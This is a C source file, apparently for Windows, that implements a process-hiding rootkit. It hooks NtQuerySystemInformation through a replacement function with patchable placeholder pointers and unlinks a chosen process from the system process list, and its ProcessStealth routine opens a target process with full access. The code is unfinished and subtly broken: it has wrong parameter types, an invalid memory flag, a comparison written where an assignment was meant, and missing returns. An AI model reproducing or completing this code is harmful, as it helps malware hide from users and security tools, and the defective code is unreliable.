#include "ProcessStealth.h"

DWORD GetProcessIdByImageName(wchar_t* ProcessName)
{
    PSYSTEM_PROCESS_INFORMATION spi;
    DWORD PID = NULL;
    ULONG ReturnLength;

    while (TRUE)
    {
        if (NtQuerySystemInformation(SystemProcessInformation, NULL, NULL, &ReturnLength) != STATUS_INFO_LENGTH_MISMATCH)
        {
            continue;
        }

        spi = VirtualAlloc(NULL, ReturnLength, MEM_COMMIT | MEM_RELEASE, PAGE_READWRITE);

        if (spi == NULL)
        {
            continue;
        }

        if (NT_SUCCESS(NtQuerySystemInformation(SystemProcessInformation, spi, ReturnLength, &ReturnLength)))
        {
            break;
        }

        VirtualFree(spi, 0, MEM_RELEASE);
    }

    PSYSTEM_PROCESS_INFORMATION temp = spi;
    spi = (ULONGLONG)spi + spi->NextEntryOffset;

    while (TRUE)
    {
        if (wcsicmp(spi->ImageName.Buffer, ProcessName) == 0)
        {
            PID = spi->UniqueProcessId;
            break;
        }

        if (spi->NextEntryOffset == 0)
            break;

        spi = (ULONGLONG)spi + spi->NextEntryOffset;
    }
    
    VirtualFree(temp, ReturnLength, MEM_DECOMMIT);
    VirtualFree(temp, 0, MEM_RELEASE);

    return PID;
}

BOOL ProcessStealth(wchar_t TargetProcessName, wchar_t HideProcessName)
{
    DWORD TargetPID = GetProcessIdByImageName(TargetProcessName);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TargetPID);

    if (hProcess == NULL)
    {
        printf("[-] OpenProcess Failed!\n");
        printf("[*] GetLastError : %d\n", GetLastError());
        return FALSE;
    }


}

NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
    volatile BYTE (NTAPI *CloneNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) = 0xCCCCCCCCCCCCCCCC;
    volatile wchar_t *HideProcessName = 0xCCCCCCCCCCCCCCCC;
    NTSTATUS ntstatus = CloneNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (ntstatus != STATUS_SUCCESS)
    {
        return ntstatus;
    }

    if (SystemInformationClass == 5)
    {
        PSYSTEM_PROCESS_INFORMATION pCur = SystemInformation;
        PSYSTEM_PROCESS_INFORMATION pPrev = pCur;
        pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;

        while (TRUE)
        {
            wchar_t s1, s2;
            BOOL ret = TRUE;

            for (int i = 0; (*(HideProcessName + i) != NULL) && (*(pCur->ImageName.Buffer + i) != NULL); i++)
            {
                s1 = Upper(*(HideProcessName + i));
                s2 = Upper(*(pCur->ImageName.Buffer + i));
                ret = (s1 == s2) ? TRUE : FALSE;
                if (ret == FALSE)
                    break;
            }

            if (ret)
                break;

            if (pCur->NextEntryOffset == 0)
                return ntstatus;
            pPrev = pCur;
            pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;
        }

        if (pCur->NextEntryOffset == 0)
            pPrev->NextEntryOffset == 0;
        else
            pPrev->NextEntryOffset += pCur->NextEntryOffset;
        return ntstatus;
    }
}